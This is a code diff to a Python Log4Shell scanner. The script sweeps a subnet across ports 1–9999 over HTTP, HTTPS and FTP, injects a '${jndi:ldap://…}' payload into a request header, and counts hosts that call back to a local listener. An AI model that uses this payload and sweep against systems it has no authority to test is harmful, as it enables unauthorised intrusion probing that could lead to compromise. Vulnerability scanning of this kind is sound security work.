@@ -17,6 +17,9 @@ import os
 from datetime import datetime
 import subprocess, platform
 
+global vul_device_counter
+vul_device_counter = 0
+
 def log(string):
     now = datetime.now()
     date_time = now.strftime("%m/%d/%Y, %H:%M:%S")
@@ -42,6 +45,7 @@ def web_server(host, port):
                 if addr[0] != host:
                     log('Connected by: ' + addr[0])
                     print('Connected by: ', addr[0])
+                    vul_device_counter = vul_device_counter + 1
                     connection_flag = 1
                 while True:
                     data = conn.recv(1024)
@@ -64,17 +68,18 @@ def mainloop(ip_addr, x):
             'Authentication':str(payload)
         }
     if pingOk(str(ip_addr) + str(x)):    
-        for proto in protocol_list:
-            url = proto + str(ip_addr) + str(x) 
-            for port in range(1,10000):
-                try:
+        for port in range(1,10000):
+            try:
+                for proto in protocol_list:
+                    url = proto + str(ip_addr) + str(x) 
                     response = requests.get((url + ':' + str(port)), headers=headers_list, timeout=1)
-                    print('Found Webpage, Testing\n' + (url + ':' + str(port)) + '\n')
+
+                    log('\nFound Webpage, Testing: ' + (url + ':' + str(port)) + '\n')
                     if response.status_code == 200:
                         found(response.content, (url + ':' + str(port)))
-                    print(response)
-                except:
-                   pass
+                    log(str(response))
+            except:
+                pass
     else:
         pass
 
@@ -111,8 +116,8 @@ def thread_out():
 
 port = input('port number\n')
 host = input("Host IP address\n")
-payload = "${jndi:ldap://" + host + ":" + port + "}"
-protocol_list = ['http://']
+payload = "${jndi:ldap://" + host + ":" + port + "/x}"
+protocol_list = ['http://', 'https://', 'ftp://']
 max_threads = 102
 
 ip_addr_input = input("Input Subnet: ex.192.168.89.\n")
@@ -121,7 +126,7 @@ log("\n Starting Web Server")
 new_thread = threading.Thread(target = web_server, args=(host, port, ))
 new_thread.name = "Web Server"
 new_thread.start()
-enter = input("Copy & Paste: " + payload + "\n")
+#enter = input("Copy & Paste: " + payload + "\n")
 log("Starting Services")
 log(payload)
 thread_out()
@@ -133,8 +138,10 @@ while int(threading.active_count()) >= 3:
         print('.')
         time.sleep(10)
     
+os.system('cls' if os.name=='nt' else 'clear')
 if connection_flag != 0:
-    log('Conncation has been made, please see vulnerability')
+    log(str(vul_device_counter) + ' devices have fallen victim to the vulnerability.')
+    print("\n please see log.txt file")
 else:
-    log('Connection logged, please see who connected.')
+    log(str(vul_device_counter) + ' devices have fallen victim to the vulnerability.')
 print("Complete")
